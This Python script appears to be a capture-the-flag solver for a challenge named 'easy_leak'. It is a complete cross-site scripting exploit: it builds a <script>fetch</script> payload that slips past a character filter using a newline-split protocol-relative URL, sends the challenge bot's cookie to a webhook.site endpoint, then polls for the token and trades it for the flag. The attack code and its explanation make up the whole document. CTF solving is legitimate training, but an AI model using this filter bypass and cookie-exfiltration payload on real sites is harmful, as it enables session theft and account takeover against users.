"""
easy_leak CTF solver — direct PHP backend (:9000, no CSP) + <script> cookie exfil

Chain:
1. appUrl on remote = http://127.0.0.1:3000  -> bot cookie TOKEN (non-httpOnly)
   is scoped to host 127.0.0.1 (any port).
2. PHP listens on 127.0.0.1:9000 (bot's own loopback, SAME namespace) and serves
   index.php WITHOUT any CSP (only Caddy :3000 adds CSP).
3. Bot visits http://127.0.0.1:9000/?content=<payload>; cookie sent: cookies are
   per-host, not per-port.
4. Payload <script>fetch(`/\n/webhook.site/UUID/?`+document.cookie)</script>
   - passes filter: no literal "//" (real newline inside template literal),
     no 'http', '&', '%', '@', '*', '[]', backslash
   - ;? no CSP on :9000 -> script RUNS
   - "//webhook.site/..." protocol-relative URL (LF stripped by URL parser)
   - server echoes cookie in the request path -> webhook.site logs it
5. POST /api/verify {token} -> flag (valid 60s).
"""
import requests
import urllib.parse
import time
import re
import sys
import urllib3

urllib3.disable_warnings()

BOT_BASE = "https://bot-9cf8d8cc310eff6b.chal.ctf.ae"
TOKEN_RE = re.compile(r"TOKEN_[0-9a-f]{16}")


def main():
    wh = requests.post("https://webhook.site/token", timeout=15).json()
    wh_uuid = wh["uuid"]
    wh_api = f"https://webhook.site/token/{wh_uuid}/requests"
    print(f"[*] fresh webhook: {wh_uuid}")

    payload = f"<script>fetch(`/\n/webhook.site/{wh_uuid}/?`+document.cookie)</script>"
    bad = re.search(r"http|data|\\\\|\*|\[|\]|&|%|@|//", payload, re.I) or \
          re.search(r"[^\x20-\x7E\r\n]", payload)
    if bad:
        print(f"[!] payload rejected by filter: {bad!r}")
        sys.exit(1)
    print(f"[*] payload ({len(payload)}B): {payload!r}")

    report_url = "http://127.0.0.1:9000/?content=" + urllib.parse.quote(payload, safe="")
    print(f"[*] report url ({len(report_url)} chars)")

    for attempt in range(4):
        r = requests.post(f"{BOT_BASE}/api/report", json={"url": report_url},
                          verify=False, timeout=40)
        print(f"[*] report -> {r.status_code} {r.text[:60]!r}")
        if r.status_code != 429:
            break
        time.sleep(20)

    deadline = time.time() + 40
    seen = set()
    while time.time() < deadline:
        try:
            r = requests.get(wh_api, timeout=10)
            if r.status_code == 200:
                for req in r.json().get("data", []):
                    u = req.get("url", "")
                    if u in seen:
                        continue
                    seen.add(u)
                    print(f"[*] webhook: {u}")
                    m = TOKEN_RE.search(u)
                    if m:
                        tok = m.group(0)
                        if tok.endswith("1234567890abcdef"):
                            print("[!] fallback token (cookie not sent to :9000)")
                            continue
                        print(f"[+] TOKEN: {tok}")
                        vr = requests.post(f"{BOT_BASE}/api/verify",
                                           json={"token": tok}, verify=False, timeout=10)
                        print(f"[+] verify -> {vr.status_code}: {vr.text}")
                        if "pwnsec{" in vr.text:
                            print(f"\n{'='*60}\n[FLAG] {vr.text}\n{'='*60}\n")
                            return
        except Exception as e:
            print(f"[!] poll error: {e}")
        time.sleep(1.5)
    print("[-] no token within window")


if __name__ == "__main__":
    main()